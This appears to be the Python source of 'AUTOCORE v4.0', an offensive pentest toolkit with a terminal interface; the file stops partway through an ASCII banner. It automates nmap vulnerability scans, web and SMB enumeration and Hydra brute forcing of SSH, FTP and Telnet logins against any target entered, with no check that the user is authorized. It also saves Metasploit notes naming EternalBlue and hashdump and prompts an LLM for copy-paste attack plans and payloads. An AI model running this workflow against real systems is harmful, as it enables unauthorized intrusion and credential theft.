#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════╗
#  AUTOCORE v4.0 — AI-Powered Pentest Toolkit
#  Author  : Ch Manan (OBLIQ_CORE) | Handle: cynex
#  GitHub  : https://github.com/Abdul-Manan-C
#  Platform: Kali · Fedora · Arch · Debian · Termux · NetHunter
# ╚══════════════════════════════════════════════════════════════════════╝

# ── Dependencies ──────────────────────────────────────────────────────
# pip install textual rich requests google-generativeai openai

from __future__ import annotations
import os, sys, json, re, asyncio, shutil, platform, subprocess
import threading, time, socket
from pathlib import Path
from datetime import datetime
from typing import Optional

# ── Rich ──────────────────────────────────────────────────────────────
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.markup import escape

# ── Textual ───────────────────────────────────────────────────────────
from textual.app import App, ComposeResult
from textual.widgets import (
    Header, Footer, Static, ListView, ListItem,
    Label, Input, Button, RichLog, ProgressBar,
    TabbedContent, TabPane, Checkbox, RadioSet, RadioButton,
    Select, TextArea
)
from textual.containers import Container, Horizontal, Vertical, ScrollableContainer
from textual.screen import Screen, ModalScreen
from textual.binding import Binding
from textual import work, on
from textual.worker import Worker, WorkerState

console = Console()

# ══════════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════════
CONFIG_DIR  = Path.home() / ".autocore"
CONFIG_FILE = CONFIG_DIR / "config.json"
SESSIONS_DIR = CONFIG_DIR / "sessions"

DEFAULT_CONFIG = {
    "ai_backend": "none",
    "gemini_api_key": "",
    "openai_api_key": "",
    "ollama_model": "llama3",
    "ollama_url": "http://localhost:11434",
    "default_depth": 4,
    "wordlist_dir": "",
    "theme": "dark",
    "auto_ai_analysis": True,
    "sessions_dir": str(SESSIONS_DIR),
}

def load_config() -> dict:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
    if not CONFIG_FILE.exists():
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG.copy()
    try:
        with open(CONFIG_FILE) as f:
            cfg = json.load(f)
        for k, v in DEFAULT_CONFIG.items():
            cfg.setdefault(k, v)
        return cfg
    except Exception:
        return DEFAULT_CONFIG.copy()

def save_config(cfg: dict):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

# ══════════════════════════════════════════════════════════════════════
# OS DETECTION
# ══════════════════════════════════════════════════════════════════════
def detect_os() -> dict:
    info = {
        "name": "linux", "pkg": "apt", "sudo": "sudo",
        "scan": "-sS", "mobile": False, "wl_dir": "/usr/share/wordlists"
    }
    # Termux
    if "com.termux" in os.environ.get("PREFIX", "") or \
       os.path.exists("/data/data/com.termux"):
        info.update({"name":"termux","pkg":"pkg","sudo":"","scan":"-sT","mobile":True,"wl_dir":str(Path.home()/"wordlists")})
        return info
    # NetHunter
    if os.path.exists("/etc/nethunter-release") or \
       (os.path.exists("/etc/kali-release") and os.environ.get("ANDROID_ROOT")):
        info.update({"name":"nethunter","pkg":"apt","sudo":"","scan":"-sT","mobile":True,"wl_dir":str(Path.home()/"wordlists")})
        return info
    # Read /etc/os-release
    os_id = ""
    try:
        with open("/etc/os-release") as f:
            for line in f:
                if line.startswith("ID="):
                    os_id = line.strip().split("=")[1].strip('"').lower()
                elif line.startswith("ID_LIKE=") and not os_id:
                    os_id = line.strip().split("=")[1].strip('"').lower()
    except Exception:
        pass
    if any(x in os_id for x in ["kali","parrot","debian","ubuntu","mint","pop"]):
        info.update({"name": os_id or "debian", "pkg":"apt","wl_dir":"/usr/share/wordlists"})
    elif "fedora" in os_id or "rhel" in os_id or "centos" in os_id:
        info.update({"name":"fedora","pkg":"dnf","wl_dir":"/usr/share/wordlists"})
    elif "arch" in os_id or "manjaro" in os_id or "endeavour" in os_id:
        info.update({"name":"arch","pkg":"pacman","wl_dir":"/usr/share/wordlists"})
    # Check sudo
    if os.geteuid() == 0:
        info["sudo"] = ""
        info["scan"] = "-sS"
    cfg = load_config()
    if cfg.get("wordlist_dir"):
        info["wl_dir"] = cfg["wordlist_dir"]
    return info

OS_INFO = detect_os()

def get_wl(name: str) -> str:
    wl = OS_INFO["wl_dir"]
    candidates = {
        "dirs":  [f"{wl}/dirb/common.txt", f"{wl}/common.txt", f"{Path.home()}/wordlists/common.txt"],
        "pass":  [f"{wl}/rockyou.txt", f"{Path.home()}/wordlists/rockyou.txt"],
        "users": [f"{wl}/metasploit/unix_users.txt", f"{Path.home()}/wordlists/unix_users.txt",
                  str(CONFIG_DIR/"unix_users.txt")],
    }
    for p in candidates.get(name, []):
        if os.path.exists(p):
            return p
    return ""

# ══════════════════════════════════════════════════════════════════════
# AI BACKEND
# ══════════════════════════════════════════════════════════════════════
class AIBackend:
    def __init__(self):
        self.cfg = load_config()
        self.backend = "none"
        self.client = None
        self._detect()

    def _detect(self):
        # 1. Try Ollama
        try:
            import requests
            r = requests.get(self.cfg.get("ollama_url","http://localhost:11434"), timeout=2)
            if r.status_code == 200:
                self.backend = "ollama"
                return
        except Exception:
            pass
        # 2. Try Gemini
        key = self.cfg.get("gemini_api_key","")
        if key:
            try:
                import google.generativeai as genai
                genai.configure(api_key=key)
                self.client = genai.GenerativeModel("gemini-1.5-flash")
                self.backend = "gemini"
                return
            except Exception:
                pass
        # 3. Try OpenAI
        key = self.cfg.get("openai_api_key","")
        if key:
            try:
                from openai import OpenAI
                self.client = OpenAI(api_key=key)
                self.backend = "openai"
                return
            except Exception:
                pass
        self.backend = "none"

    def ask(self, prompt: str) -> str:
        if self.backend == "none":
            return "⚠ No AI configured. Go to Settings to add an API key."
        try:
            if self.backend == "gemini":
                resp = self.client.generate_content(prompt)
                return resp.text
            elif self.backend == "openai":
                resp = self.client.chat.completions.create(
                    model="gpt-4o-mini",
                    messages=[{"role":"user","content":prompt}]
                )
                return resp.choices[0].message.content
            elif self.backend == "ollama":
                import requests
                model = self.cfg.get("ollama_model","llama3")
                resp = requests.post(
                    f"{self.cfg.get('ollama_url','http://localhost:11434')}/api/generate",
                    json={"model": model, "prompt": prompt, "stream": False},
                    timeout=120
                )
                return resp.json().get("response","No response")
        except Exception as e:
            return f"AI Error: {e}"

    def analyze_scan(self, findings: dict) -> str:
        prompt = f"""You are an expert penetration tester. Analyze these scan findings and respond in markdown:

Target: {findings.get('target','unknown')}
OS: {findings.get('os', OS_INFO['name'])}
Open Ports: {findings.get('ports','none')}
Services: {findings.get('services','none')}
Vulnerabilities: {findings.get('vulns','none')}
CVEs Found: {findings.get('cves','none')}

Provide:
## Executive Summary
(3 sentences max)

## Severity Rating
(Critical / High / Medium / Low — with reason)

## Top 3 Attack Recommendations
(numbered, each with exact command)

## Vulnerability Explanations
(plain English, one paragraph per vuln)

## Quick Wins
(easiest things to try first)"""
        return self.ask(prompt)

    def generate_exploit_plan(self, findings: dict) -> str:
        prompt = f"""You are an expert penetration tester. Generate a detailed attack plan in markdown for:

Target: {findings.get('target','unknown')}
Open Ports: {findings.get('ports','none')}
Services: {findings.get('services','none')}
Vulnerabilities: {findings.get('vulns','none')}
CVEs: {findings.get('cves','none')}
OS: {findings.get('os','unknown')}

Format as attack_plan.md with:
# Attack Plan — {findings.get('target','TARGET')}
## Phase 1: Initial Access
## Phase 2: Exploitation
## Phase 3: Post-Exploitation
## Exact Commands (copy-paste ready)
## Metasploit Modules
## Payloads"""
        return self.ask(prompt)

AI = AIBackend()

# ══════════════════════════════════════════════════════════════════════
# CVE LOOKUP
# ══════════════════════════════════════════════════════════════════════
def lookup_cves(text: str) -> list[dict]:
    cve_ids = list(set(re.findall(r'CVE-\d{4}-\d+', text, re.IGNORECASE)))
    results = []
    for cid in cve_ids[:10]:
        try:
            import requests
            r = requests.get(f"https://cve.circl.lu/api/cve/{cid.upper()}", timeout=8)
            if r.status_code == 200:
                data = r.json()
                score = data.get("cvss","N/A")
                try:
                    score_f = float(score)
                    if score_f >= 9.0:   sev = "[bold red]CRITICAL[/]"
                    elif score_f >= 7.0: sev = "[bold orange1]HIGH[/]"
                    elif score_f >= 4.0: sev = "[bold yellow]MEDIUM[/]"
                    else:                sev = "[bold green]LOW[/]"
                except Exception:
                    sev = "[dim]UNKNOWN[/]"
                results.append({
                    "id": cid.upper(),
                    "cvss": str(score),
                    "severity": sev,
                    "summary": (data.get("summary","No description") or "")[:120]
                })
            else:
                results.append({"id":cid.upper(),"cvss":"N/A","severity":"UNKNOWN","summary":"Lookup failed"})
        except Exception as e:
            results.append({"id":cid.upper(),"cvss":"N/A","severity":"UNKNOWN","summary":f"Error: {e}"})
    return results

# ══════════════════════════════════════════════════════════════════════
# SESSION MANAGEMENT
# ══════════════════════════════════════════════════════════════════════
class Session:
    def __init__(self, target: str):
        self.target = target
        self.ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.name = f"autocore_{target}_{self.ts}"
        base = Path(load_config().get("sessions_dir", str(SESSIONS_DIR)))
        self.path = base / self.name
        self.findings: dict = {
            "target": target, "timestamp": self.ts,
            "platform": OS_INFO["name"], "ports": "",
            "services": {}, "vulns": [], "cves": [],
            "credentials": [], "subdomains": [],
            "ai_summary": "", "ai_severity": "",
            "ai_next_steps": "", "attack_plan": "",
            "errors": [], "files": []
        }
        self._create_dirs()

    def _create_dirs(self):
        for d in ["nmap","web","nikto","smb","hydra","metasploit",
                  "whatweb","enum","loot","cve","screenshots","ai"]:
            (self.path / d).mkdir(parents=True, exist_ok=True)

    def save_file(self, subpath: str, content: str):
        fp = self.path / subpath
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_text(content)
        self.findings["files"].append(str(fp))

    def generate_report(self):
        f = self.findings
        has_vulns = bool(f.get("vulns"))
        has_cves  = bool(f.get("cves"))
        has_creds = bool(f.get("credentials"))
        has_ai    = bool(f.get("ai_summary"))

        md = f"""# AUTOCORE v4.0 — Pentest Report
**Target:** {f['target']}  
**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Platform:** {f['platform']}  
**Session:** {self.name}

---

## Open Ports
{f['ports'] or '_None found_'}

## Detected Services
"""
        for svc, val in (f.get("services") or {}).items():
            md += f"- **{svc}**: {val}\n"
        if not f.get("services"):
            md += "_None detected_\n"

        if has_vulns:
            md += "\n## Vulnerabilities\n"
            for v in f["vulns"]:
                md += f"- {v}\n"

        if has_cves:
            md += "\n## CVE Details\n"
            md += "| CVE ID | CVSS | Severity | Description |\n"
            md += "|--------|------|----------|-------------|\n"
            for c in f["cves"]:
                md += f"| {c['id']} | {c['cvss']} | {c['severity']} | {c['summary']} |\n"

        if has_creds:
            md += "\n## Credentials Found\n"
            for cr in f["credentials"]:
                md += f"- {cr}\n"

        if has_ai:
            md += f"\n## AI Analysis\n{f['ai_summary']}\n"
        if f.get("attack_plan"):
            md += f"\n## Attack Plan\n{f['attack_plan']}\n"

        md += "\n## Output Files\n"
        for fp in f.get("files",[]):
            md += f"- `{fp}`\n"

        self.save_file(f"REPORT_{f['target']}.md", md)
        # JSON report
        self.save_file(f"REPORT_{f['target']}.json", json.dumps(f, indent=2))

def list_sessions() -> list[dict]:
    base = Path(load_config().get("sessions_dir", str(SESSIONS_DIR)))
    base.mkdir(parents=True, exist_ok=True)
    sessions = []
    for d in sorted(base.iterdir(), reverse=True):
        if d.is_dir() and d.name.startswith("autocore_"):
            parts = d.name.split("_")
            target = parts[1] if len(parts) > 1 else "unknown"
            ts = "_".join(parts[2:]) if len(parts) > 2 else ""
            rpt = list(d.glob("REPORT_*.md"))
            sessions.append({"name":d.name,"target":target,"ts":ts,"path":str(d),"has_report":bool(rpt)})
    return sessions

# ══════════════════════════════════════════════════════════════════════
# TOOL INSTALLER
# ══════════════════════════════════════════════════════════════════════
TOOLS = {
    "nmap":       {"apt":"nmap","dnf":"nmap","pacman":"nmap","pkg":"nmap"},
    "hydra":      {"apt":"hydra","dnf":"hydra","pacman":"hydra","pkg":"hydra"},
    "nikto":      {"apt":"nikto","dnf":"nikto","pacman":"nikto","git":"https://github.com/sullo/nikto"},
    "whatweb":    {"apt":"whatweb","dnf":"","pacman":"whatweb","gem":"whatweb"},
    "gobuster":   {"apt":"gobuster","dnf":"gobuster","pacman":"gobuster","go":"github.com/OJ/gobuster/v3@latest"},
    "smbclient":  {"apt":"smbclient","dnf":"samba-client","pacman":"smbclient","pkg":"smbclient"},
    "enum4linux": {"apt":"enum4linux","dnf":"","pacman":"enum4linux","url":"https://raw.githubusercontent.com/CiscoCXSecurity/enum4linux/master/enum4linux.pl"},
    "subfinder":  {"go":"github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"},
    "curl":       {"apt":"curl","dnf":"curl","pacman":"curl","pkg":"curl"},
    "wget":       {"apt":"wget","dnf":"wget","pacman":"wget","pkg":"wget"},
    "whois":      {"apt":"whois","dnf":"whois","pacman":"whois","pkg":"whois"},
    "host":       {"apt":"dnsutils","dnf":"bind-utils","pacman":"bind","pkg":"dnsutils"},
}

def install_tool(name: str, methods: dict, log_fn=None) -> bool:
    def log(msg):
        if log_fn: log_fn(msg)

    pkg = OS_INFO["pkg"]
    sudo = OS_INFO["sudo"]
    sp = f"{sudo} " if sudo else ""

    # Method 1: native package manager
    pkg_name = methods.get(pkg, "")
    if pkg_name:
        log(f"  Trying {pkg} install {pkg_name}...")
        r = subprocess.run(f"{sp}{pkg} install -y {pkg_name}",
                           shell=True, capture_output=True, text=True)
        if r.returncode == 0 and shutil.which(name):
            log(f"  ✔ {name} installed via {pkg}")
            return True

    # Method 2: go install
    go_pkg = methods.get("go","")
    if go_pkg and shutil.which("go"):
        log(f"  Trying go install {go_pkg}...")
        r = subprocess.run(f"go install {go_pkg}", shell=True,
                           capture_output=True, text=True)
        # go installs to ~/go/bin
        go_bin = Path.home() / "go" / "bin" / name
        if go_bin.exists():
            subprocess.run(f"{sp}cp {go_bin} /usr/local/bin/{name}",
                           shell=True, capture_output=True)
            if shutil.which(name): return True

    # Method 3: gem
    gem_pkg = methods.get("gem","")
    if gem_pkg and shutil.which("gem"):
        log(f"  Trying gem install {gem_pkg}...")
        r = subprocess.run(f"{sp}gem install {gem_pkg}",
                           shell=True, capture_output=True, text=True)
        if shutil.which(name): return True

    # Method 4: git clone
    git_url = methods.get("git","")
    if git_url:
        log(f"  Trying git clone {git_url}...")
        dest = f"/opt/{name}"
        subprocess.run(f"{sp}git clone {git_url} {dest}",
                       shell=True, capture_output=True)
        # find executable
        for candidate in [f"{dest}/program/{name}.pl", f"{dest}/{name}.pl",
                          f"{dest}/{name}"]:
            if os.path.exists(candidate):
                subprocess.run(f"{sp}ln -sf {candidate} /usr/local/bin/{name}",
                               shell=True, capture_output=True)
                subprocess.run(f"{sp}chmod +x {candidate}",
                               shell=True, capture_output=True)
                if shutil.which(name): return True

    # Method 5: direct URL (for perl scripts etc)
    dl_url = methods.get("url","")
    if dl_url:
        log(f"  Trying download from {dl_url}...")
        dest = f"/usr/local/bin/{name}"
        r = subprocess.run(f"{sp}wget -q {dl_url} -O {dest}",
                           shell=True, capture_output=True)
        if r.returncode == 0:
            subprocess.run(f"{sp}chmod +x {dest}", shell=True, capture_output=True)
            if shutil.which(name): return True

    return False

# ══════════════════════════════════════════════════════════════════════
# SCANNER
# ══════════════════════════════════════════════════════════════════════
class Scanner:
    def __init__(self, session: Session, output_fn=None):
        self.session = session
        self.target = session.target
        self.out = output_fn or print
        self.sudo = OS_INFO["sudo"]
        self.scan = OS_INFO["scan"]
        self.mobile = OS_INFO["mobile"]
        self.sp = f"{self.sudo} " if self.sudo else ""
        self.HAS_WEB = self.HAS_SMB = self.HAS_SSH = False
        self.HAS_FTP = self.HAS_TELNET = False
        self.open_ports = ""
        self._stop = False

    def stop(self): self._stop = True

    def _run(self, cmd: str, outfile: str = "", timeout: int = 300) -> str:
        self.out(f"[cyan]  >> {cmd}[/cyan]")
        output_lines = []
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            for line in proc.stdout:
                if self._stop: proc.terminate(); break
                line = line.rstrip()
                output_lines.append(line)
                self.out(f"[dim]{escape(line)}[/dim]")
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            self.out("[yellow]  ! Timeout — moving on[/yellow]")
        except Exception as e:
            self.out(f"[red]  ✘ Error: {escape(str(e))}[/red]")
        result = "\n".join(output_lines)
        if outfile:
            self.session.save_file(outfile, result)
            self.out(f"[blue]  💾 Saved: {outfile}[/blue]")
        return result

    def _has(self, tool: str) -> bool:
        return bool(shutil.which(tool))

    def _set_flags(self, text: str):
        for line in text.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                p = int(m.group(1))
                if p in (80,443,8080,8443,8000): self.HAS_WEB = True
                if p in (445,139):               self.HAS_SMB = True
                if p == 22:                       self.HAS_SSH = True
                if p == 21:                       self.HAS_FTP = True
                if p == 23:                       self.HAS_TELNET = True

    def _announce(self, phase: str):
        self.out(f"\n[cyan bold]╔══════════════════════════════════════════════════╗[/cyan bold]")
        self.out(f"[cyan bold]║  {phase:<48}║[/cyan bold]")
        self.out(f"[cyan bold]╚══════════════════════════════════════════════════╝[/cyan bold]\n")

    # ── Phase 1: Recon ────────────────────────────────────────────────
    def phase_recon(self):
        self._announce("PHASE 1 — RECON")
        lines = []
        for cmd, label in [
            (f"ping -c 3 {self.target}", "PING"),
            (f"whois {self.target}", "WHOIS"),
            (f"host {self.target}", "HOST"),
            (f"nslookup {self.target}", "NSLOOKUP"),
        ]:
            tool = cmd.split()[0]
            if not self._has(tool):
                self.out(f"[yellow]  ! {tool} not found — skipping[/yellow]"); continue
            self.out(f"\n[white]=== {label} ===[/white]")
            out = self._run(cmd)
            lines.append(f"=== {label} ===\n{out}")
        self.session.save_file("enum/recon.txt", "\n\n".join(lines))

    # ── Phase 2: Nmap ─────────────────────────────────────────────────
    def phase_nmap(self, depth: int = 4):
        self._announce("PHASE 2 — NMAP PORT SCAN")
        if self.mobile:
            self.out("[yellow]  ! Mobile platform — using TCP connect (-sT)[/yellow]")

        # Quick scan
        out = self._run(
            f"{self.sp}nmap -Pn {self.scan} -T4 --top-ports 1000 {self.target}",
            "nmap/nmap_1_quick.txt"
        )
        if depth <= 2:
            self._set_flags(out)
            self.open_ports = self._parse_ports(out)
            self._announce_services()
            return

        # Full port scan
        out2 = self._run(
            f"{self.sp}nmap -Pn {self.scan} -T4 -p- {self.target}",
            "nmap/nmap_2_fullports.txt"
        )
        self.open_ports = self._parse_ports(out2) or self._parse_ports(out)
        self.out(f"[green]  ✔ Open ports: {self.open_ports or 'none'}[/green]")

        if self.open_ports and depth >= 3:
            # Service detection
            self._run(
                f"{self.sp}nmap -Pn {self.scan} -sV -sC -p{self.open_ports} {self.target}",
                "nmap/nmap_3_services.txt"
            )
        if self.open_ports and depth >= 4:
            # Vuln scripts
            vuln_out = self._run(
                f"{self.sp}nmap -Pn --script vuln -p{self.open_ports} {self.target}",
                "nmap/nmap_4_vulns.txt"
            )
            # Parse vulns
            for line in vuln_out.splitlines():
                if "VULNERABLE" in line or re.search(r'CVE-\d{4}-\d+', line):
                    self.session.findings["vulns"].append(line.strip())

        if not self.mobile and depth >= 4:
            # OS detection
            self._run(f"{self.sp}nmap -Pn -O {self.target}", "nmap/nmap_5_os.txt")

        self._set_flags(out2)
        self._announce_services()

        # CVE Lookup
        if depth >= 4:
            all_nmap = "\n".join([
                (self.session.path / "nmap" / f).read_text()
                for f in ["nmap_4_vulns.txt"] if (self.session.path/"nmap"/f).exists()
            ])
            if all_nmap:
                self.out("\n[cyan]  → Looking up CVEs...[/cyan]")
                cves = lookup_cves(all_nmap)
                if cves:
                    self.session.findings["cves"] = cves
                    self.out(f"[green]  ✔ Found {len(cves)} CVEs[/green]")
                    self.session.save_file("cve/cve_report.json", json.dumps(cves, indent=2))

    def _parse_ports(self, text: str) -> str:
        ports = []
        for line in text.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m: ports.append(m.group(1))
        return ",".join(ports)

    def _announce_services(self):
        svcs = []
        if self.HAS_WEB:    svcs.append("Web"); self.session.findings["services"]["web"] = "HTTP/HTTPS"
        if self.HAS_SMB:    svcs.append("SMB"); self.session.findings["services"]["smb"] = "Samba"
        if self.HAS_SSH:    svcs.append("SSH"); self.session.findings["services"]["ssh"] = "OpenSSH"
        if self.HAS_FTP:    svcs.append("FTP"); self.session.findings["services"]["ftp"] = "FTP"
        if self.HAS_TELNET: svcs.append("Telnet"); self.session.findings["services"]["telnet"] = "Telnet"
        if svcs:
            self.out(f"[green]  ✔ Services detected: {', '.join(svcs)}[/green]")
        self.session.findings["ports"] = self.open_ports

    # ── Phase 3: Web ──────────────────────────────────────────────────
    def phase_web(self):
        self._announce("PHASE 3 — WEB ENUMERATION")
        if not self.HAS_WEB:
            self.out("[yellow]  ! No web service detected — skipping[/yellow]"); return

        nmap_full = ""
        nf = self.session.path / "nmap" / "nmap_2_fullports.txt"
        if nf.exists(): nmap_full = nf.read_text()

        proto = "https" if re.search(r'^443/tcp\s+open', nmap_full, re.M) else "http"
        url   = f"{proto}://{self.target}"
        self.out(f"[cyan]  → Target URL: {url}[/cyan]")

        if self._has("whatweb"):
            self._run(f"whatweb {url}", "whatweb/whatweb_1.txt")
        if self._has("nikto"):
            self._run(f"nikto -h {url} -o /tmp/nikto_tmp.txt", timeout=120)
            if os.path.exists("/tmp/nikto_tmp.txt"):
                self.session.save_file("nikto/nikto_1.txt",
                    open("/tmp/nikto_tmp.txt").read())

        wl = get_wl("dirs")
        if self._has("gobuster") and wl:
            self._run(f"gobuster dir -u {url} -w {wl} -q", "web/gobuster_1_dirs.txt", timeout=180)
            self._run(f"gobuster dir -u {url} -w {wl} -x php,txt,html,js -q",
                      "web/gobuster_2_files.txt", timeout=180)
        else:
            self.out("[yellow]  ! gobuster or wordlist missing — skipping dir enum[/yellow]")

        if self._has("curl"):
            self._run(f"curl -skI {url}", "web/headers_1.txt")
            self._run(f"curl -sk {url}/robots.txt", "web/robots_1.txt")
            self._run(f"curl -sk {url}/sitemap.xml", "web/sitemap_1.txt")

    # ── Phase 4: SMB ──────────────────────────────────────────────────
    def phase_smb(self):
        self._announce("PHASE 4 — SMB ENUMERATION")
        if not self.HAS_SMB:
            self.out("[yellow]  ! No SMB detected — skipping[/yellow]"); return
        if not self.mobile:
            if self._has("enum4linux"):
                self._run(f"enum4linux -a {self.target}", "smb/enum4linux_1.txt", timeout=180)
            if self._has("smbclient"):
                self._run(f"smbclient -L //{self.target} -N", "smb/smb_1_shares.txt")
        else:
            self.out("[yellow]  ! Mobile: nmap SMB scripts only[/yellow]")
        self._run(
            f"{self.sp}nmap -Pn -p 445,139 --script smb-vuln*,smb-enum* {self.target}",
            "smb/nmap_smb_scripts.txt", timeout=120
        )

    # ── Phase 5: Brute ────────────────────────────────────────────────
    def phase_brute(self):
        self._announce("PHASE 5 — BRUTE FORCE")
        if not self._has("hydra"):
            self.out("[yellow]  ! hydra not installed — skipping[/yellow]"); return
        wl_p = get_wl("pass"); wl_u = get_wl("users")
        if not wl_p:
            self.out("[yellow]  ! rockyou.txt not found — skipping[/yellow]"); return
        if not wl_u:
            # create minimal user list
            uw = str(CONFIG_DIR / "unix_users.txt")
            Path(uw).write_text("root\nadmin\nuser\ntest\nguest\nftp\npi\nkali\n")
            wl_u = uw
        did_brute = False
        if self.HAS_SSH:
            self._run(f"hydra -L {wl_u} -P {wl_p} {self.target} ssh -t 4", "hydra/hydra_1_ssh.txt", timeout=300)
            did_brute = True
        if self.HAS_FTP:
            self._run(f"hydra -L {wl_u} -P {wl_p} {self.target} ftp -t 4", "hydra/hydra_2_ftp.txt", timeout=300)
            did_brute = True
        if self.HAS_TELNET:
            self._run(f"hydra -L {wl_u} -P {wl_p} {self.target} telnet -t 4", "hydra/hydra_3_telnet.txt", timeout=300)
            did_brute = True
        if self.HAS_WEB:
            self.session.save_file("hydra/hydra_http_template.txt",
                f"# hydra -L users.txt -P rockyou.txt {self.target} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
        if not did_brute:
            self.out("[yellow]  ! No brutable services (SSH/FTP/Telnet) detected[/yellow]")
        # Parse creds
        for f in (self.session.path/"hydra").glob("*.txt"):
            for line in f.read_text().splitlines():
                if "login:" in line and "host:" in line:
                    self.session.findings["credentials"].append(line.strip())

    # ── Phase 6: MSF Notes ────────────────────────────────────────────
    def phase_msf(self):
        self._announce("PHASE 6 — METASPLOIT NOTES")
        notes = f"""# AUTOCORE — Metasploit Notes
# Target: {self.target} | {datetime.now()}

msfconsole

# Quick scan
use auxiliary/scanner/portscan/tcp
set RHOSTS {self.target}; run

# SMB EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {self.target}; set LHOST <your_ip>; run

# Post exploitation
use post/multi/recon/local_exploit_suggester
use post/linux/gather/hashdump

# Useful scanners
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_header
"""
        self.session.save_file("metasploit/msf_notes.txt", notes)
        self.out("[green]  ✔ MSF notes saved[/green]")

    # ── Phase 7: AI ───────────────────────────────────────────────────
    def phase_ai(self):
        self._announce("PHASE 7 — AI ANALYSIS")
        if AI.backend == "none":
            self.out("[yellow]  ! No AI configured — skipping. Use Settings to add API key.[/yellow]")
            return
        self.out(f"[cyan]  → Sending findings to {AI.backend.upper()}...[/cyan]")
        analysis = AI.analyze_scan(self.session.findings)
        self.session.findings["ai_summary"] = analysis
        self.session.save_file("ai/ai_analysis.md", analysis)
        self.out("[green]  ✔ AI analysis complete[/green]")
        for line in analysis.splitlines()[:20]:
            self.out(f"[dim]{escape(line)}[/dim]")

        plan = AI.generate_exploit_plan(self.session.findings)
        self.session.findings["attack_plan"] = plan
        self.session.save_file("ai/attack_plan.md", plan)
        self.out("[green]  ✔ Attack plan generated[/green]")

    # ── Full run ──────────────────────────────────────────────────────
    def run(self, depth: int = 4, phases: list = None):
        phases = phases or self._phases_for_depth(depth)
        if "recon"  in phases: self.phase_recon()
        if "nmap"   in phases: self.phase_nmap(depth)
        if "web"    in phases: self.phase_web()
        if "smb"    in phases: self.phase_smb()
        if "brute"  in phases: self.phase_brute()
        if "msf"    in phases: self.phase_msf()
        if "ai"     in phases: self.phase_ai()
        self.session.generate_report()
        self._announce("SCAN COMPLETE")
        self.out(f"[green bold]  ✔ Report: {self.session.path}/REPORT_{self.target}.md[/green bold]")

    def _phases_for_depth(self, depth: int) -> list:
        base = ["recon"]
        if depth >= 2: base += ["nmap"]
        if depth >= 3: base += ["web"]
        if depth >= 4: base += ["smb","msf"]
        if depth >= 5: base += ["brute"]
        if depth >= 4: base += ["ai"]
        return base

# ══════════════════════════════════════════════════════════════════════
# TUI SCREENS
# ══════════════════════════════════════════════════════════════════════

# ── CSS ───────────────────────────────────────────────────────────────
CSS = """
Screen {
    background: #0d1117;
    color: #c9d1d9;
}
#sidebar {
    width: 22;
    background: #161b22;
    border-right: solid #30363d;
    padding: 1 0;
}
#main {
    background: #0d1117;
    padding: 1 2;
}
.nav-item {
    padding: 0 2;
    height: 1;
    color: #8b949e;
}
.nav-item:hover { background: #21262d; color: #c9d1d9; }
.nav-active { color: #58a6ff; background: #1c2128; }
.nav-sep { color: #30363d; padding: 0 2; }
#header-bar {
    background: #161b22;
    border-bottom: solid #30363d;
    height: 3;
    padding: 0 2;
    color: #58a6ff;
}
#status-bar {
    background: #161b22;
    border-top: solid #30363d;
    height: 3;
    padding: 0 2;
    color: #8b949e;
}
RichLog {
    background: #0d1117;
    color: #c9d1d9;
    border: none;
    scrollbar-color: #30363d #0d1117;
}
Input {
    background: #161b22;
    border: solid #30363d;
    color: #c9d1d9;
    margin: 1 0;
}
Input:focus { border: solid #58a6ff; }
Button {
    background: #21262d;
    border: solid #30363d;
    color: #c9d1d9;
    margin: 0 1;
}
Button:hover { background: #30363d; }
Button.-primary {
    background: #1f6feb;
    border: solid #388bfd;
    color: white;
}
Button.-danger {
    background: #da3633;
    border: solid #f85149;
    color: white;
}
.panel-title {
    color: #58a6ff;
    text-style: bold;
    padding: 1 0 0 0;
}
DataTable {
    background: #0d1117;
    color: #c9d1d9;
}
"""

# ── Home Screen ───────────────────────────────────────────────────────
class HomeScreen(Screen):
    def compose(self) -> ComposeResult:
        yield Static(self._banner(), id="home-banner")

    def _banner(self) -> str:
        ai_status = f"[green]{AI.backend.upper()}[/green]" if AI.backend != "none" else "[red]NO AI[/red]"
        os_name = OS_INFO['name'].upper()
        sessions = len(list_sessions())
        return f"""[red]
  ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ▄████▄   ▒█████   ██▀███  ▓█████
 ▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀
 ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒███
 ░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄
  ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▒
[/red][dim]
  ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░   ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
